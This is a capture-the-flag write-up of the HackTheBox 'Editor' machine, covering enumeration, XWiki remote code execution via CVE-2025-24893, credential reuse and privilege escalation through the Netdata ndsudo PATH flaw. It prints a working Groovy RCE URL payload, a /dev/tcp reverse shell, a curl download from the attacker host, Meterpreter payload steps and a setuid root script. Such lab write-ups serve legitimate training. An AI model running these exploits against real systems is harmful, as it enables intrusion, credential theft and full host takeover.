---
title: "HackTheBox - Editor"
date: 2023-12-21 00:00:00 +0800
categories: [HackTheBox - Easy Machines]
tags: [HackTheBox CTFs]
---

Editor is an easy-difficulty Linux machine that requires identifying vulnerable services to gain an initial foothold. An outdated instance of XWiki is exposed and vulnerable to remote code execution, which is leveraged to obtain a reverse shell on the target. Post-exploitation enumeration of XWiki configuration files reveals reusable credentials, which are successfully used to authenticate to the SSH service as another user. From there, standard Linux privilege escalation checks uncover an untrusted search path vulnerability, allowing escalation to root.

---

## 1. Enumeration Phase
#### Host Discovery

We start with enumerating the target. Before starting my service scans, I always run a `ping` request *(ICMP Echo Requests)* to the target. We can see this below.

```shell
└─$ ping 10.10.11.80                
PING 10.10.11.80 (10.10.11.80) 56(84) bytes of data.
64 bytes from 10.10.11.80: icmp_seq=1 ttl=63 time=188 ms
64 bytes from 10.10.11.80: icmp_seq=2 ttl=63 time=310 ms
```

We can see that we receive an *ICMP Echo Reply* from the target indicating that the target is 
reachable.

---

#### Port and Service Enumeration

I then perform a full TCP port scan, followed by service and version detection on discovered ports.

```shell
└─$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.80 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

└─$ nmap -p$ports -sC -sV 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 23:55 SAST
Nmap scan report for 10.10.11.80
Host is up (0.38s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
...
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
...
8080/tcp open  http    Jetty 10.0.20
...
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
...
```

**Services Identified:**
- **Port 22**      [SSH Service]    -  OpenSSH 8.9p1
- **Port 80**      [HTTP Service]  -  nginx 1.18.0
- **Port 8080**  [HTTP Service]  -  Jetty 10.0.20

I first map all services and their detected versions identified during the port scan to gain a clear understanding of the exposed attack surface before manually interacting with the web applications.

---

#### Virtual Host Resolution

Before doing so, whenever a domain is referenced in the Nmap output, such as through an `http-title: Did not follow redirect to` message, I add the domain to the `/etc/hosts` file to ensure proper resolution during further testing.

```shell
└─$ echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts  
10.10.11.80 editor.htb
```

---

#### Web Enumeration - `editor.htb`

With the domain now added to the `/etc/hosts` file, I proceed to examine the web application. While manually reviewing the site, I also begin directory fuzzing using `gobuster` to identify any hidden or unlinked resources.

```shell
└─$ gobuster dir -u http://editor.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

...
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://editor.htb/assets/]
/index.html           (Status: 200) [Size: 631]
Progress: 4746 / 4746 (100.00%)
... 
```

The directory fuzzing doesn't yield much. Navigating to `http://editor.htb/assets/` gives a nginx error `403 Forbidden`. 

**Application Observations:**

- Landing page for **SimplistCode Pro**
- Download links for Debian/Ubuntu and Windows
- About page describing the application
- A **Docs** link present in the navigation bar

Clicking the **Docs** link in the navigation bar returns an error in the browser. Reviewing this request in the Burp Suite browser reveals a reference to a previously unknown subdomain.

![Description](assets/HTB - Editor CTF - img1.png)

---

#### Wiki Subdomain Discovery

This looks like a new subdomain we can add to `/etc/hosts` file.

```shell
echo "10.10.11.80 wiki.editor.htb" | sudo tee -a /etc/hosts
```

We can then begin to manually enumerate the `wiki.editor.htb` endpoint.

![Description](assets/HTB - Editor CTF - img2.png)

**Key Observations:**
- Full URL: `http://wiki.editor.htb/xwiki/bin/view/Main/`.
- Appears to be the **SimplistCode Pro documentation**.
- Login functionality available.
- `JSESSIONID` cookie set.
- XWiki version disclosed: **XWiki Debian 15.10.8**.
- Page metadata shows: _Last modified by Neal Bagwell_.
- Installation documentation available.

---

## 2. Pre-Exploitation Phase

After completing thorough enumeration, the next step is to leverage our findings for potential exploits. I always start by running `searchsploit` on all discovered services to identify known vulnerabilities. In this case, the key targets are `XWiki Debian 15.10.8` and `Jetty 10.0.20`. Here are some relevant results from `searchsploit`:

```shell
─$ searchsploit Jetty          
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Eclipse Jetty 11.0.5 - Sensitive File Disclosure                                                                | java/webapps/50478.txt
Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Execution                                              | cgi/webapps/21895.txt
Jetty 4.1 Servlet Engine - Cross-Site Scripting                                                                 | jsp/webapps/21875.txt
Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulnerabilities                                      | jsp/webapps/33564.txt
jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / Injection                                     | jsp/webapps/9887.txt
Jetty 9.4.37.v20210219 - Information Disclosure                                                                 | java/webapps/50438.txt
Jetty Web Server - Directory Traversal                                                                          | windows/remote/36318.txt
Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service                                                 | multiple/dos/8646.php
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```shell
searchsploit XWiki               
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
XWiki 14 - SQL Injection via getdeleteddocuments.vm                                                             | multiple/webapps/52384.c
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                                                                  | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Remote Code Execution                                                                 | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE) 
```

These results highlight potential vulnerabilities in both services, but the standout is the **critical unauthenticated Remote Code Execution (RCE)** in XWiki, specifically **CVE-2025-24893**. This affects all versions prior to 15.10.11, 16.4.1, and 16.5.0RC1. Since our target runs `XWiki Debian 15.10.8`, it falls squarely in the vulnerable range.

For deeper insight on CVE-2025-24893, these resources are invaluable:

- [OffSec Blog on CVE-2025-24893](https://www.offsec.com/blog/cve-2025-24893/)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)
- [Exploit-DB: 52429](https://www.exploit-db.com/exploits/52429)

To verify if the exploit works, you can send a crafted request to the target’s XWiki instance that uses the **SolrSearch** macro to execute arbitrary commands. Here’s an example URL:

```shell
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(println%28%22id%22.execute%28%29.text%29)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

- `http://wiki.editor.htb/xwiki` is the target URL.
- The payload exploits the SolrSearch macro’s Groovy execution to run system commands.
- The key part: `println("id".execute().text)` runs the `id` command on the target.

Running this request returned the expected output of the `id` command on the target, confirming successful remote code execution.

![Description](assets/HTB - Editor CTF - img3.png)

Notice the yellow which contains the output of the `id` command on the target machine.

---

## 3. Exploitation Phase

Now that we have confirmed a working exploit, let's try to use it to get shell on the target. Attempting to run reverse shells through the URL didn't result in anything so I decided to send a reverse shell script to the target by following the below steps:

1. Create reverse shell payload called `shell.sh`.
   
2. Insert the below contents:

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

Replace `10.10.14.1` with your attacker machine IP and `4444` with the port you’ll listen on.

3. Start a Python HTTP Server on attacker host:

```shell
python3 -m http.server 80
```

4. Pull the `shell.sh` file into the `/tmp` directory on the target machine. Do this using the RCE vulnerability we found earlier using the something like the below command:

```shell
curl 10.10.14.1/shell.sh -o /tmp/shell.sh
```

5. Start Netcat Listener:

```shell
nc -lvnp 4444
```

6. Confirm the file has successfully downloaded on the target machine under the `/tmp` folder and then run the file using `bash /tmp/shell.sh`.

This successfully gave me a reverse shell as the `xwiki` user. To improve stability, I upgraded the shell with the following steps:

```shell
# In the reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell with Ctrl+Z, then:
stty raw -echo; fg

# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash
```

With the shell stabilized, I was ready to move on.

---

## 4. Post-Exploitation Phase

After gaining a foothold, I started hunting for useful credentials and stumbled upon the `hibernate.cfg.xml` file, which revealed database connection details including passwords:

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep pass
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
```

I then went into the whole file and found this data.

```shell
...
   <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

...
```

Credentials found:
- **Username:** xwiki
- **Password:** theEd1t0rTeam99

Very nice stuff!

I then tried these on SSH and the XWiki login page but no luck. 

![Description](assets/HTB - Editor CTF - img4.png)

I then returned to the reverse shell I had and decided to enumerate for more users by check the `/home` folder.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ ls /home
oliver
```

The output returned a user named `oliver`. I attempted SSH login as `oliver` using the same password:

**Username:** oliver
**Password:** theEd1t0rTeam99

```
ssh oliver@10.10.11.80
```

This ended up working. Yay! we got in as Oliver. 

Running `ls` in the Current Working Directory for Oliver retuned the `user.txt` file which contained the User Flag.

---

## 5. Linux Privilege Escalation

During privilege escalation enumeration, I noticed the user `oliver` belongs to the `netdata` group:

```shell
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

The `oliver` user is part of the `netdata` group. I noted this down and continued enumerating until I found that the host is running a few local instances of different services. 

```shell
oliver@editor:~$ netstat -ltp 

Active Internet connections (only servers)
...   
tcp        0      0 localhost:8125          0.0.0.0:*               LISTEN 
tcp        0      0 localhost:19999         0.0.0.0:*               LISTEN         
...        
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN          
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN           
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN           
tcp        0      0 localhost:33235         0.0.0.0:*               LISTEN           
tcp6       0      0 localhost:8079          [::]:*                  LISTEN     
...
```

I decided to do a Local Port Forward via SSH by exposing the local service running on port 19999 on the target host to my attacker machine.

```shell
ssh -L 19999:localhost:19999 oliver@editor.htb
```

After setting up the Local Port Forward, I then navigate to the `localhost:19999` service on my attacker machine and get the below web page:

![Description](assets/HTB - Editor CTF - img5.png)

This seems to be an instance of Netdata which is a distributed, real-time observability platform that monitors metrics and logs from systems and applications. After manually enumerating the web application, I came across an alert that mentions a Critical Severity issue where an upgrade to a newer version needs to happen.

![Description](assets/HTB - Editor CTF - img6.png)

Seeing this, I made note of the version running (`Netdata v1.45.2 `) and decided to look online for any vulnerabilities affecting this version. Research showed this version is vulnerable to **CVE-2024-32019**, a local privilege escalation bug. The vulnerability centers on `ndsudo`, a root-owned SUID binary. Although `ndsudo` restricts which external commands it runs, it uses the `PATH` environment variable insecurely, meaning an attacker can control where it looks for commands.

---


## 6. Root Exploitation Phase

With all the above in mind, I attempt to run the **CVE-2024-32019** exploits I've gathered through research, I performed 2 methods which both gave me a root shell.

#### Method 1: Metasploit Module for CVE-2024-32019

**Source**: https://www.rapid7.com/db/modules/exploit/linux/local/ndsudo_cve_2024_32019/

First I attempt to get a remote session to the target as the module will need us to have an existing session to the target to work. This is done by doing the following:

1. Run the below commands in order.

```shell
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
set ExitOnSession false
run -j
```

2. Then generate a Linux x64 payload using `msfsvenom`

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o shell.elf
```

3. Make the payload executable

```shell
chmod +x shell.elf
```

4. I transferred the payload via `SSH/SCP`

```shell
scp shell.elf user@target:/tmp/
```

5. In the SSH session I have on the target host, I ran the below to trigger the shell on Meterpreter.

```shell
./tmp/shell.elf
```


After following the above steps, I was able to get a Meterpreter session to the Target Hosts on Metasploit. I then go into the session established by running `sessions -i 1`. Once in the session. I background the session using `background` and set up the **CVE-2024-32019** Metasploit Module by running all the below in order.

```shell
use exploit/linux/local/ndsudo_cve_2024_32019
set SESSION 1
set NdsudoPath /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
set ForceExploit true
set LHOST [ATTACKER_IP]
set LPORT 4445
exploit
```

*Remember to set the `NdsudoPath` as the Target doesn't have `ndsudo` in the typical default path.* 

After running `exploit` I got a root shell on the Target Host and was able to get the root flag!

```shell
meterpreter > getuid
Server username: root
meterpreter > ls /root
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-12-23 23:46:15 +0200  .bash_history
100644/rw-r--r--  3106  fil   2021-10-15 12:06:05 +0200  .bashrc
040700/rwx------  4096  dir   2023-04-27 18:09:20 +0200  .cache
040755/rwxr-xr-x  4096  dir   2025-06-19 10:14:00 +0200  .config
040755/rwxr-xr-x  4096  dir   2023-04-27 18:35:32 +0200  .local
100644/rw-r--r--  161   fil   2019-07-09 12:05:50 +0200  .profile
040700/rwx------  4096  dir   2025-06-19 13:30:19 +0200  .ssh
100640/rw-r-----  33    fil   2025-12-23 23:46:55 +0200  root.txt
040755/rwxr-xr-x  4096  dir   2025-06-19 10:14:25 +0200  scripts
040700/rwx------  4096  dir   2023-04-27 18:07:19 +0200  snap

meterpreter > cat root.txt
[-] stdapi_fs_stat: Operation failed: 1
meterpreter > cat /root/root.txt
[flag]
```

---

#### Method 2: Manual Exploitation of CVE-2024-32019

This is another method of getting a root shell on the target host. We will manually perform the exploit. First we need to remember some things. `ndsudo` is a SUID binary that runs with root privileges. It allows execution of specific whitelisted commands. Instead of using absolute paths for commands, it searches the `PATH` environment variable. Attacker can manipulate `PATH` to point to malicious executables. When `ndsudo` executes a command, it runs the attacker's version as root.

This is a basic `PATH` manipulation Privilege Escalation vector, also called `PATH` hijacking. Firstly, we locate the `ndsudo` binary using the below

```shell
find /opt/netdata -iname ndsudo -exec ls -la {} \;
```

The output shows us the following details:

- `-rwsr-x---`: SUID bit is set (the `s` in `-rws`)
- Owner: `root`
- Group: `netdata`
- Only owner and group members can execute

If we recall, the `oliver` user is spart of the `netdata` group so we can execute this binary. I then run the below to understand what we can do with the binary:

```shell
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

`ndsudo` allows us to execute to run commands that use other binaries. I use the `nvme` binary ass my target. I perform all the below.

1. I navigate to `/dev/shm` to create my malicious binary. This folder is World-writeable so perfect to use for this attack.

2. I then create the malicious binary using `nano nvme` and add the below contents into the file:

```shell
#!/usr/bin/env python3
import os

os.setuid(0)
os.system('/bin/bash')
```

**Code Breakdown:**
- `#!/usr/bin/env python3`: Shebang for Python 3 execution
- `os.setuid(0)`: Set user ID to 0 (root)
- `os.system('/bin/bash')`: Execute bash shell with root privileges


3. I then make the script executable by running `chmod +x nvme`.

4. I then modify the `PATH` environment variable to include the `/dev/shm` in the beginning:

```shell
export PATH=/dev/shm:$PATH
```

I confirm this also by running all the below:

```shell
echo $PATH
# /dev/shm:/usr/local/bin:/usr/bin:/bin:...

which nvme
# /dev/shm/nvme
```

We are now ready to perform the exploit. I simply run the below command and I get an root shell:

```shell
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

YAY!! We are root and I'm able to get the root flag.


---
---
## Conclusion

This was a really good Linux box that helped me get more comfortable with all the basics.

![Description](assets/HTB - Editor CTF - img7.png)

---
